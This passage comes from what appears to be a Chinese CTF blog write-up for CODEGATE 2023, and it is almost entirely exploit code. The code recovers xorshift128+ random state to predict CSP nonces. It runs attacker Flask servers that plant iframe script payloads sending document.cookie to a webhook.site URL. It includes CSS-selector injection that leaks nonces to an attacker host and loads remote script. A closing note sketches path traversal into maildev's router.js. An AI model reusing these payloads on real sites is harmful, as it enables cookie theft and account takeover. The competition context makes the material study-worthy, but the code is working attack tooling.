class="keyword">for</span> i <span class="keyword">in</span> question]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_solution</span>(<span class="params">prefix_count</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">make_left_shift</span>(<span class="params">state, n</span>):</span><br><span class="line">            <span class="keyword">return</span> state[n:] + [<span class="number">0</span>]*n</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">make_right_shift</span>(<span class="params">state, n</span>):</span><br><span class="line">            <span class="keyword">return</span> [<span class="number">0</span>]*n + state[:-n]</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">make_xor</span>(<span class="params">s1, s2</span>):</span><br><span class="line">            <span class="keyword">return</span> [s1[i]^s2[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line">        As = []</span><br><span class="line">        bs = []</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">add_equs</span>(<span class="params">ss, vals, cnt</span>):</span><br><span class="line">            <span class="keyword">nonlocal</span> As, bs</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt):</span><br><span class="line">                As.append(ss[i])</span><br><span class="line">                bs.append((vals&gt;&gt;(cnt-<span class="number">1</span>-i))&amp;<span class="number">1</span>)</span><br><span class="line">        matched = <span class="number">0</span></span><br><span class="line">        cur = <span class="number">0</span></span><br><span class="line">        se_state0 = [<span class="number">1</span>&lt;&lt;i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line">        se_state1 = [<span class="number">1</span>&lt;&lt;i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>, <span class="number">128</span>)]</span><br><span class="line">        <span class="keyword">while</span> matched &lt; <span class="built_in">len</span>(sequence):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">                se_s1 = se_state0</span><br><span class="line">                se_s0 = se_state1</span><br><span class="line">                se_state0 = se_s0</span><br><span class="line">                se_s1 = make_xor(se_s1, make_left_shift(se_s1, <span class="number">23</span>))</span><br><span class="line">                se_s1 = make_xor(se_s1, make_right_shift(se_s1, <span class="number">17</span>))</span><br><span class="line">                se_s1 = make_xor(se_s1, se_s0)</span><br><span class="line">                se_s1 = make_xor(se_s1, make_right_shift(se_s0, <span class="number">26</span>))</span><br><span class="line">                se_state1 = se_s1</span><br><span class="line">                correct_index = <span class="number">64</span> - <span class="number">1</span> - i + cur - prefix_count</span><br><span class="line">                <span class="keyword">if</span> correct_index &gt;= <span class="number">0</span> <span class="keyword">and</span> correct_index &lt; <span class="built_in">len</span>(sequence):</span><br><span class="line">                    uu = sames_for[sequence[correct_index]]</span><br><span class="line">                    add_equs(se_state0, uu[<span class="number">0</span>], uu[<span class="number">1</span>])</span><br><span class="line">                    matched += <span class="number">1</span></span><br><span class="line">            cur += <span class="number">64</span></span><br><span class="line">        BAs = [<span class="number">0</span>]*<span class="number">128</span></span><br><span class="line">        Bbs = [<span class="number">0</span>]*<span class="number">128</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(As)):</span><br><span class="line">            A, b = As[i], bs[i]</span><br><span class="line">            listed = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> ((A&gt;&gt;j)&amp;<span class="number">1</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> BAs[j] == <span class="number">0</span>:</span><br><span class="line">                    BAs[j] = A</span><br><span class="line">                    Bbs[j] = b</span><br><span class="line">                    listed = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    A ^= BAs[j]</span><br><span class="line">                    b ^= Bbs[j]</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> listed <span class="keyword">and</span> b:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)[::-<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">assert</span> BAs[i] != <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="number">128</span>):</span><br><span class="line">                <span class="keyword">if</span> (BAs[i]&gt;&gt;j)&amp;<span class="number">1</span>:</span><br><span class="line">                    Bbs[i] ^= Bbs[j]</span><br><span class="line">        se_state0 = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> Bbs[:<span class="number">64</span>]]), <span class="number">2</span>)</span><br><span class="line">        se_state1 = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> Bbs[<span class="number">64</span>:]]), <span class="number">2</span>)</span><br><span class="line">        generated = <span class="number">0</span></span><br><span class="line">        full = []</span><br><span class="line">        <span class="keyword">while</span> generated &lt; <span class="built_in">len</span>(sequence) + prefix_count + <span class="number">128</span>:</span><br><span class="line">            cached = []</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">                se_s1 = se_state0</span><br><span class="line">                se_s0 = se_state1</span><br><span class="line">                se_state0 = se_s0</span><br><span class="line">                se_s1 ^= (se_s1 &lt;&lt; <span class="number">23</span>) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">                se_s1 ^= se_s1 &gt;&gt; <span class="number">17</span></span><br><span class="line">                se_s1 ^= se_s0</span><br><span class="line">                se_s1 ^= se_s0 &gt;&gt; <span class="number">26</span></span><br><span class="line">                se_state1 = se_s1</span><br><span class="line">                cached.append(struct.unpack(<span class="string">&quot;d&quot;</span>, struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, (se_state0 &gt;&gt; <span class="number">12</span>) | <span class="number">0x3FF0000000000000</span>))[<span class="number">0</span>] - <span class="number">1</span>)</span><br><span class="line">            generated += <span class="number">64</span></span><br><span class="line">            full += cached[::-<span class="number">1</span>]</span><br><span class="line">        full = full[prefix_count:]</span><br><span class="line">        full = <span class="string">&#x27;&#x27;</span>.join([alphabet[<span class="built_in">int</span>(v * <span class="built_in">len</span>(alphabet))] <span class="keyword">for</span> v <span class="keyword">in</span> full])</span><br><span class="line">        <span class="keyword">assert</span> full[:<span class="built_in">len</span>(sequence)] == question</span><br><span class="line">        ans = full[<span class="built_in">len</span>(sequence):][:<span class="number">128</span>]</span><br><span class="line">        <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        ret = test_solution(i)</span><br><span class="line">        <span class="keyword">if</span> ret:</span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;no solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username, password</span>):</span><br><span class="line">    <span class="keyword">global</span> sess</span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    url = <span class="string">&#x27;http://3.37.109.189:8080/login&#x27;</span></span><br><span class="line">    sess.post(url, data=&#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">title, content</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://3.37.109.189:8080/write&#x27;</span></span><br><span class="line">    r = sess.post(url, data=&#123;</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>: title,</span><br><span class="line">        <span class="string">&#x27;content&#x27;</span>: content</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">share</span>(<span class="params"><span class="built_in">id</span>=<span class="number">0</span></span>):</span><br><span class="line">    url = <span class="string">&#x27;http://3.37.109.189:8080/share_diary/0&#x27;</span></span><br><span class="line">    r = sess.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">            const genNonce = () =&gt; &quot;_&quot;.repeat(8).replace(/_/g,()=&gt;&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;.charAt(Math.random()*36));</span></span><br><span class="line"><span class="string">            async function cc() &#123;</span></span><br><span class="line"><span class="string">                const url = &#x27;http://localhost&#x27;</span></span><br><span class="line"><span class="string">                let code = &#x27;&#x27;;</span></span><br><span class="line"><span class="string">                for (let i = 0; i &lt; 15; i++) &#123;</span></span><br><span class="line"><span class="string">                    let resp = await fetch(&#x27;http://3.37.109.189:8080&#x27; + &#x27;/share/read&#x27;);</span></span><br><span class="line"><span class="string">                    let text = await resp.text();</span></span><br><span class="line"><span class="string">                    code += text.match(/nonce-[0-9a-z]+/)?.at(0).replace(&#x27;nonce-&#x27;, &#x27;&#x27;);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                const userId = genNonce();</span></span><br><span class="line"><span class="string">                let extra = open(url + &#x27;/share/read#id=0&amp;username=&#x27; + encodeURIComponent(userId)) // will NOT throw exception if not created</span></span><br><span class="line"><span class="string">                console.log(code);</span></span><br><span class="line"><span class="string">                let resp = await fetch(&#x27;/solve?q=&#x27; + encodeURIComponent(code) + &#x27;&amp;u=&#x27; + encodeURIComponent(userId)); // get predicted nonce from server (with note created)</span></span><br><span class="line"><span class="string">                let text = await resp.text();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                setTimeout(()=&gt;&#123;</span></span><br><span class="line"><span class="string">                    extra.location.href = &quot;http://&quot; + location.host + &quot;/solve&quot;;</span></span><br><span class="line"><span class="string">                    setTimeout(()=&gt;&#123;</span></span><br><span class="line"><span class="string">                        extra.history.go(-1); // reload, but with bfcache so that nonce won&#x27;t change, and refresh the `hashchange` event trigger that has been deleted</span></span><br><span class="line"><span class="string">                        setTimeout(()=&gt;&#123;</span></span><br><span class="line"><span class="string">                            extra.location.href = url + &#x27;/share/read#id=0&amp;username=&#x27; + encodeURIComponent(userId)+&#x27;&amp;34sdctycv&#x27;; // trigger `hashchange`</span></span><br><span class="line"><span class="string">                    &#125;,1000)</span></span><br><span class="line"><span class="string">                    &#125;,1000)</span></span><br><span class="line"><span class="string">                &#125;, 1000);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            cc().catch((e)=&gt;&#123;fetch(&#x27;https://webhook.site/92e3da06-c183-4282-919f-1fb4a8e21437/&#x27;+e.toString())&#125;);</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/solve&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sol</span>():</span><br><span class="line">    question = request.form.get(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> question:</span><br><span class="line">        question = request.args.get(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> question:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no question&quot;</span></span><br><span class="line">    ans = solve(question, alphabet, sames_for)</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    user = request.args.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">    login(user, user)</span><br><span class="line">    write(<span class="string">&#x27;test&#x27;</span>, <span class="string">f&#x27;&lt;iframe srcdoc=&quot;&lt;script nonce=<span class="subst">&#123;ans[:<span class="number">16</span>]&#125;</span>&gt;fetch(`https://webhook.site/92e3da06-c183-4282-919f-1fb4a8e21437/?a=`+document.cookie)&lt;/script&gt;&quot;&gt;&lt;iframe&gt;&#x27;</span>)</span><br><span class="line">    share()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>附官方WP（使用socket进行通信持续控制页面，基于事件触发需要的更新，攻击者动态返回所需CSS）:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">from</span> flask_socketio <span class="keyword">import</span> SocketIO</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;test1234&#x27;</span></span><br><span class="line">socketio = SocketIO(app,cors_allowed_origins=<span class="string">&quot;*&quot;</span>)</span><br><span class="line">nonce = <span class="string">&quot;&quot;</span></span><br><span class="line">self_url = <span class="string">&quot;http://141.164.55.51:8000/gen_exfil_css?nonce=&quot;</span></span><br><span class="line">s = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@socketio.on(<span class="params"><span class="string">&#x27;start&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_my_custom_event</span>(<span class="params">methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;start&#x27;</span>)</span><br><span class="line">    socketio.emit(<span class="string">&#x27;nonce&#x27;</span>, json.dumps(&#123;<span class="string">&quot;nonce&quot;</span>:nonce&#125;))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;script src=&quot;https://cdn.socket.io/4.3.2/socket.io.min.js&quot; integrity=&quot;sha384-KAZ4DtjNhLChOB/hxXuKqhMLYvx3b5MlT55xPEiNmREKRzeEm+RVPlTnAn0ajQNs&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">    var socket</span></span><br><span class="line"><span class="string">    var isRun = 0;</span></span><br><span class="line"><span class="string">    var nonce = &quot;&quot;</span></span><br><span class="line"><span class="string">    var a,b = undefined;</span></span><br><span class="line"><span class="string">    idx = -1;</span></span><br><span class="line"><span class="string">    function sleep(ms) &#123;</span></span><br><span class="line"><span class="string">        return new Promise((r) =&gt; setTimeout(r, ms));</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    async function make_shared_note(nonce) &#123;</span></span><br><span class="line"><span class="string">        make_note = window.open(`http://141.164.55.51:8000/gen_exfil_css?nonce=$&#123;nonce&#125;`);</span></span><br><span class="line"><span class="string">        idx = idx + 1;</span></span><br><span class="line"><span class="string">        await sleep(400)</span></span><br><span class="line"><span class="string">        make_note.location = `http://localhost/share_diary/$&#123;idx&#125;`</span></span><br><span class="line"><span class="string">        await sleep(400)</span></span><br><span class="line"><span class="string">        make_note.close()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    async function exploit(nonce) &#123;</span></span><br><span class="line"><span class="string">        make_note = window.open(`http://141.164.55.51:8000/exploit?nonce=$&#123;nonce&#125;`);</span></span><br><span class="line"><span class="string">        idx = idx + 1;</span></span><br><span class="line"><span class="string">        await sleep(400)</span></span><br><span class="line"><span class="string">        make_note.location = `http://localhost/share_diary/$&#123;idx&#125;`</span></span><br><span class="line"><span class="string">        await sleep(400)</span></span><br><span class="line"><span class="string">        make_note.close()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function start() &#123;</span></span><br><span class="line"><span class="string">        socket = io.connect(&#x27;http://141.164.55.51:8000&#x27;);</span></span><br><span class="line"><span class="string">        socket.on(&#x27;connect&#x27;, function() &#123;</span></span><br><span class="line"><span class="string">        console.log(&#x27;start&#x27;);</span></span><br><span class="line"><span class="string">        socket.emit( &#x27;start&#x27;, &#123;</span></span><br><span class="line"><span class="string">            data: &#x27;start&#x27;</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string">        &#125;)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    socket.on(&#x27;nonce&#x27;, async function(data) &#123;</span></span><br><span class="line"><span class="string">        if(!isRun) &#123;</span></span><br><span class="line"><span class="string">        isRun = 1;</span></span><br><span class="line"><span class="string">        if(JSON.parse(data).nonce.length==16)&#123;</span></span><br><span class="line"><span class="string">            await exploit(JSON.parse(data).nonce);</span></span><br><span class="line"><span class="string">            try &#123;</span></span><br><span class="line"><span class="string">                a.onload = 1</span></span><br><span class="line"><span class="string">            &#125; catch &#123;</span></span><br><span class="line"><span class="string">                a.location = &quot;http://ssrf.kr/redirect_cg.html&quot;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            await sleep(400);</span></span><br><span class="line"><span class="string">            a.location.href = `http://localhost/share/read#id=$&#123;idx&#125;`</span></span><br><span class="line"><span class="string">            a.focus();</span></span><br><span class="line"><span class="string">            a.focus();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        else if(nonce &lt;= JSON.parse(data).nonce)&#123;</span></span><br><span class="line"><span class="string">            nonce = JSON.parse(data).nonce</span></span><br><span class="line"><span class="string">            await make_shared_note(nonce);</span></span><br><span class="line"><span class="string">            console.log(nonce);</span></span><br><span class="line"><span class="string">            if(!b) &#123;</span></span><br><span class="line"><span class="string">                b = window.open(&quot;about:blank&quot;)</span></span><br><span class="line"><span class="string">                a = window.open(&quot;http://localhost/share/read&quot;)</span></span><br><span class="line"><span class="string">                await sleep(400)</span></span><br><span class="line"><span class="string">                b.location.href = &quot;http://localhost/share/read&quot;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            try &#123;</span></span><br><span class="line"><span class="string">                a.onload = 1</span></span><br><span class="line"><span class="string">            &#125; catch &#123;</span></span><br><span class="line"><span class="string">                a.location = &quot;http://ssrf.kr/redirect_cg.html&quot;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            await sleep(400);</span></span><br><span class="line"><span class="string">            a.location.href = `http://localhost/share/read#id=$&#123;idx&#125;`</span></span><br><span class="line"><span class="string">            a.focus();</span></span><br><span class="line"><span class="string">            a.focus();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        isRun = 0;</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    chall_url = &quot;http://localhost/&quot;</span></span><br><span class="line"><span class="string">    start();</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/exploit&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    nonce = request.args.get(<span class="string">&#x27;nonce&#x27;</span>)</span><br><span class="line">    payload = <span class="string">f&quot;&quot;&quot;&lt;iframe srcdoc=&quot;&lt;script nonce=<span class="subst">&#123;nonce&#125;</span> src=//ssrf.kr/ex.js&gt;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;&lt;body onload=&quot;form.submit()&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;form id=&#x27;form&#x27; action=&quot;http://localhost/write&quot;, method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;text&quot; name=&quot;title&quot; value=&quot;exploit&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;content&quot; value=&#x27;<span class="subst">&#123;payload&#125;</span>&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/gen_exfil_css&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">css</span>():</span><br><span class="line">    <span class="keyword">global</span> nonce</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(nonce)&lt;=<span class="built_in">len</span>(request.args.get(<span class="string">&#x27;nonce&#x27;</span>)):</span><br><span class="line">        nonce = request.args.get(<span class="string">&#x27;nonce&#x27;</span>)</span><br><span class="line">        app.logger.info(nonce)</span><br><span class="line">        rules = []</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">            rules.append(</span><br><span class="line">                <span class="string">&quot;&quot;&quot;script[nonce^=&quot;&#123;nonce&#125;&#123;c&#125;&quot;] &#123;&#123; background-image: url(&#123;self_url&#125;&#123;ce&#125;) !important&#125;&#125;&quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                    nonce=nonce, self_url=self_url, c=c, ce=nonce+ urllib.parse.quote(c)</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        rules_str = <span class="string">&quot;\n&quot;</span>.join(rules)</span><br><span class="line">        payload = <span class="string">&quot;&quot;&quot;&lt;style&gt;* &#123;&#123; display: block !important; &#125;&#125;&#123;rules_str&#125;&lt;/style&gt;&quot;&quot;&quot;</span>.<span class="built_in">format</span>(rules_str=rules_str)</span><br><span class="line">        socketio.emit(<span class="string">&#x27;nonce&#x27;</span>, json.dumps(&#123;<span class="string">&quot;nonce&quot;</span>:nonce&#125;))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;&quot;&quot;&lt;body onload=&quot;form.submit()&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;form id=&#x27;form&#x27; action=&quot;http://localhost/write&quot;, method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;text&quot; name=&quot;title&quot; value=&quot;exploit&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;content&quot; value=&#x27;<span class="subst">&#123;payload&#125;</span>&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        socketio.emit(<span class="string">&#x27;nonce&#x27;</span>, json.dumps(&#123;<span class="string">&quot;nonce&quot;</span>:nonce&#125;))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;asdf&quot;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    socketio.run(app, host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8000</span> ,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="乐子"><a href="#乐子" class="headerlink" title="乐子"></a>乐子</h3><p>很多队都是使用随机数预测直接破的。主办方表示：<br><img src="/2023/08/29/CODEGATE2023/lezi.png" alt="notcrypto" loading="lazy"></p><h2 id="0day"><a href="#0day" class="headerlink" title="0day"></a>0day</h2><p>利用路径穿越写maildev的lib&#x2F;router.js增加自定义路由。<br>调用：把服务打挂（例如试图写&#x2F;flag或者&#x2F;etc&#x2F;passwd什么的），重启的时候就会加载。  </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write-Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
